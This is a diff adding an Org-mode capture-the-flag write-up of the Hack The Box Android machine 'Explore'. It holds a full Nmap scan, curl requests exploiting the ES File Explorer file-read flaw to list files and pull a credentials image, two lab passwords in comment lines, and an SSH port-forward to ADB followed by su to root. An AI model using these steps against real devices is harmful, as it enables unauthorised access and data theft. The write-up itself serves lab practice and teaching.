@@ -1,0 +1,311 @@
+#+TITLE: Explore
+#+AUTHOR: Romeu Vieira
+
+#+OPTIONS: html-style:nil
+#+OPTIONS: html-scripts:nil
+
+#+OPTIONS: author:nil
+#+OPTIONS: email:nil
+#+OPTIONS: date:t
+#+OPTIONS: toc:nil
+
+#+PROPERTY: header-args :eval no
+
+#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="/style.css"/>
+
+#+EXPORT_FILE_NAME: explore
+
+#+BEGIN_EXPORT html
+<p class="spacing-64" \>
+#+END_EXPORT
+
+#+TOC: headlines 2
+
+#+BEGIN_EXPORT html
+<p class="spacing-64" \>
+#+END_EXPORT
+
+* Enumeration
+
+This machine is a bit different, since it is an Android device!
+After using =Nmap=, this is the result:
+
+#+begin_src
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 18:12 WEST
+Nmap scan report for 10.10.10.247
+Host is up (0.046s latency).
+Not shown: 65530 closed ports
+PORT      STATE    SERVICE VERSION
+2222/tcp  open     ssh     (protocol 2.0)
+| fingerprint-strings:
+|   NULL:
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey:
+|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
+5555/tcp  filtered freeciv
+34065/tcp open     unknown
+| fingerprint-strings:
+|   GenericLines:
+|     HTTP/1.0 400 Bad Request
+|     Date: Sun, 04 Jul 2021 17:12:09 GMT
+|     Content-Length: 22
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|   GetRequest:
+|     HTTP/1.1 412 Precondition Failed
+|     Date: Sun, 04 Jul 2021 17:12:09 GMT
+|     Content-Length: 0
+|   HTTPOptions:
+|     HTTP/1.0 501 Not Implemented
+|     Date: Sun, 04 Jul 2021 17:12:14 GMT
+|     Content-Length: 29
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Method not supported: OPTIONS
+|   Help:
+|     HTTP/1.0 400 Bad Request
+|     Date: Sun, 04 Jul 2021 17:12:29 GMT
+|     Content-Length: 26
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: HELP
+|   RTSPRequest:
+|     HTTP/1.0 400 Bad Request
+|     Date: Sun, 04 Jul 2021 17:12:14 GMT
+|     Content-Length: 39
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     valid protocol version: RTSP/1.0
+|   SSLSessionReq:
+|     HTTP/1.0 400 Bad Request
+|     Date: Sun, 04 Jul 2021 17:12:29 GMT
+|     Content-Length: 73
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|     ?G???,???`~?
+|     ??{????w????<=?o?
+|   TLSSessionReq:
+|     HTTP/1.0 400 Bad Request
+|     Date: Sun, 04 Jul 2021 17:12:29 GMT
+|     Content-Length: 71
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|     ??random1random2random3random4
+|   TerminalServerCookie:
+|     HTTP/1.0 400 Bad Request
+|     Date: Sun, 04 Jul 2021 17:12:29 GMT
+|     Content-Length: 54
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|_    Cookie: mstshash=nmap
+42135/tcp open     http    ES File Explorer Name Response httpd
+|_http-title: Site doesn't have a title (text/html).
+59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+|_http-title: Site doesn't have a title (text/plain).
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port2222-TCP:V=7.91%I=7%D=7/4%Time=60E1EC11%P=x86_64-unknown-linux-gnu%
+SF:r(NULL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port34065-TCP:V=7.91%I=7%D=7/4%Time=60E1EC10%P=x86_64-unknown-linux-gnu
+SF:%r(GenericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,
+SF:\x2004\x20Jul\x202021\x2017:12:09\x20GMT\r\nContent-Length:\x2022\r\nCo
+SF:ntent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\
+SF:r\n\r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20
+SF:412\x20Precondition\x20Failed\r\nDate:\x20Sun,\x2004\x20Jul\x202021\x20
+SF:17:12:09\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTT
+SF:P/1\.0\x20501\x20Not\x20Implemented\r\nDate:\x20Sun,\x2004\x20Jul\x2020
+SF:21\x2017:12:14\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text
+SF:/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20no
+SF:t\x20supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\
+SF:x20Request\r\nDate:\x20Sun,\x2004\x20Jul\x202021\x2017:12:14\x20GMT\r\n
+SF:Content-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASC
+SF:II\r\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20vers
+SF:ion:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r
+SF:\nDate:\x20Sun,\x2004\x20Jul\x202021\x2017:12:29\x20GMT\r\nContent-Leng
+SF:th:\x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnec
+SF:tion:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessio
+SF:nReq,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x2004\x20J
+SF:ul\x202021\x2017:12:29\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:
+SF:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInva
+SF:lid\x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?
+SF:`~\?\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(Termin
+SF:alServerCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\
+SF:x2004\x20Jul\x202021\x2017:12:29\x20GMT\r\nContent-Length:\x2054\r\nCon
+SF:tent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r
+SF:\n\r\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20
+SF:mstshash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\
+SF:r\nDate:\x20Sun,\x2004\x20Jul\x202021\x2017:12:29\x20GMT\r\nContent-Len
+SF:gth:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConne
+SF:ction:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01
+SF:\0\0e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
+Service Info: Device: phone
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 137.33 seconds
+#+end_src
+
+Well, there is a *lot* to unpack here. So many different ports are open on this
+machine. We have some ports related to games (=5555= and =59777=). There is an
+HTTP server port by =ES File Explorer= (=42135=). There is also an unknown port,
+=34065=.
+
+Port =5555= is an interesting case because, since this is an Android device, it
+should be related to =Adb=. This one is obvious to me, since I have been doing
+Android development for years.
+
+Doing a fast search on Exploit-DB, there is an arbitrary file read vulnerability
+on =ES File Explorer=. It includes a script, but I am going to try it out with
+=cURL=. There is a list of possible POST commands in this link: https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566.
+
+#+begin_src
+$ curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777/
+
+[
+{"name":"lib", "time":"3/25/20 05:12:02 AM", "type":"folder", "size":"12.00 KB (12,288 Bytes)", },
+{"name":"vndservice_contexts", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"65.00 Bytes (65 Bytes)", },
+{"name":"vendor_service_contexts", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
+{"name":"vendor_seapp_contexts", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
+{"name":"vendor_property_contexts", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"392.00 Bytes (392 Bytes)", },
+{"name":"vendor_hwservice_contexts", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
+{"name":"vendor_file_contexts", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"6.92 KB (7,081 Bytes)", },
+{"name":"vendor", "time":"3/25/20 12:12:33 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
+{"name":"ueventd.rc", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"5.00 KB (5,122 Bytes)", },
+{"name":"ueventd.android_x86_64.rc", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"464.00 Bytes (464 Bytes)", },
+{"name":"system", "time":"3/25/20 12:12:31 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
+{"name":"sys", "time":"7/4/21 01:21:23 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
+{"name":"storage", "time":"7/4/21 01:21:30 PM", "type":"folder", "size":"80.00 Bytes (80 Bytes)", },
+{"name":"sepolicy", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"357.18 KB (365,756 Bytes)", },
+{"name":"sdcard", "time":"7/4/21 01:42:43 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
+{"name":"sbin", "time":"7/4/21 01:21:23 PM", "type":"folder", "size":"140.00 Bytes (140 Bytes)", },
+{"name":"product", "time":"3/24/20 11:39:17 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
+{"name":"proc", "time":"7/4/21 01:21:22 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
+{"name":"plat_service_contexts", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"13.73 KB (14,057 Bytes)", },
+{"name":"plat_seapp_contexts", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"1.28 KB (1,315 Bytes)", },
+{"name":"plat_property_contexts", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"6.53 KB (6,687 Bytes)", },
+{"name":"plat_hwservice_contexts", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"7.04 KB (7,212 Bytes)", },
+{"name":"plat_file_contexts", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"23.30 KB (23,863 Bytes)", },
+{"name":"oem", "time":"7/4/21 01:21:23 PM", "type":"folder", "size":"40.00 Bytes (40 Bytes)", },
+{"name":"odm", "time":"7/4/21 01:21:23 PM", "type":"folder", "size":"220.00 Bytes (220 Bytes)", },
+{"name":"mnt", "time":"7/4/21 01:21:24 PM", "type":"folder", "size":"240.00 Bytes (240 Bytes)", },
+{"name":"init.zygote64_32.rc", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"875.00 Bytes (875 Bytes)", },
+{"name":"init.zygote32.rc", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"511.00 Bytes (511 Bytes)", },
+{"name":"init.usb.rc", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"5.51 KB (5,646 Bytes)", },
+{"name":"init.usb.configfs.rc", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"7.51 KB (7,690 Bytes)", },
+{"name":"init.superuser.rc", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"582.00 Bytes (582 Bytes)", },
+{"name":"init.rc", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"29.00 KB (29,697 Bytes)", },
+{"name":"init.environ.rc", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"1.04 KB (1,064 Bytes)", },
+{"name":"init.android_x86_64.rc", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"3.36 KB (3,439 Bytes)", },
+{"name":"init", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"2.29 MB (2,401,264 Bytes)", },
+{"name":"fstab.android_x86_64", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"753.00 Bytes (753 Bytes)", },
+{"name":"etc", "time":"3/25/20 03:41:52 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
+{"name":"dev", "time":"7/4/21 01:21:25 PM", "type":"folder", "size":"2.64 KB (2,700 Bytes)", },
+{"name":"default.prop", "time":"7/4/21 01:21:23 PM", "type":"file", "size":"1.09 KB (1,118 Bytes)", },
+{"name":"data", "time":"3/15/21 04:49:09 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
+{"name":"d", "time":"7/4/21 01:21:22 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
+{"name":"config", "time":"7/4/21 01:21:24 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
+{"name":"charger", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
+{"name":"cache", "time":"7/4/21 01:21:24 PM", "type":"folder", "size":"120.00 Bytes (120 Bytes)", },
+{"name":"bugreports", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
+{"name":"bin", "time":"3/25/20 12:26:22 AM", "type":"folder", "size":"8.00 KB (8,192 Bytes)", },
+{"name":"acct", "time":"7/4/21 01:21:23 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }
+]%
+#+end_src
+
+It does list files! I am using port =59777= because it is the one that worked,
+although =Nmap= says it belongs to a Bukkit HTTP server. But the port is
+unmistakingly related to =ES File Explorer=.
+
+* User
+
+One of the directories is =sdcard=, it is normally what the user sees when
+opening an Android file explorer. It should contain =user.txt=:
+
+#+begin_src
+$ curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777/sdcard
+[
+{"name":"user.txt", "time":"3/13/21 06:28:55 PM", "type":"file", "size":"33.00 Bytes (33 Bytes)", },
+]%
+#+end_src
+
+There are more files, but =user.txt= is what matters. Regardless, a pretty easy
+user flag!
+
+* Root
+
+One could check other directories in =sdcard=, but most are empty. Except, the
+=DCIM= directory has an interesting JPEG file called “creds”:
+
+#+begin_src
+curl --header "Content-Type: application/json" http://10.10.10.247:59777/sdcard/DCIM/creds.jpg --output creds.jpg
+#+end_src
+
+Well... it is an image of a username password pair. Since there is an SSH server
+open port, maybe we can connect to it:
+
+# Kr1sT!5g@Rp3xPl0r3!
+# Kr1sT!5h@Rp3xPl0r3!
+
+#+begin_src
+$ ssh kristi@10.10.10.247 -p 2222
+
+$ id
+uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768
+#+end_src
+
+Connecting through SSH was successful and we are under an odd =id=. We can’t
+execute anything as root, no way of doing that. But we do know that ADB is
+listening to port =5555=. Maybe it is possible to do some tunneling through our
+own machine:
+
+#+begin_src
+$ ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222
+
+# ssh session will open
+# open a new terminal and type:
+
+$ adb -s localhost:5555 shell
+
+# we will get a shell session where we can just execute `su` to get root permissions
+
+$ id
+uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
+$ su
+# id
+uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
+
+#+end_src
+
+To get the flag, we should access a directory that has exclusive root
+permissions, like =/data=. There are a lot of files in there, but a quick =find
+. -name "root.txt"= reveals the file in this same directory.
+
+* FOOTER                                                                                              :ignore:
+:PROPERTIES:
+:clearpage: t
+:END:
+#+BEGIN_EXPORT html
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">24-04-2021</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+#+END_EXPORT
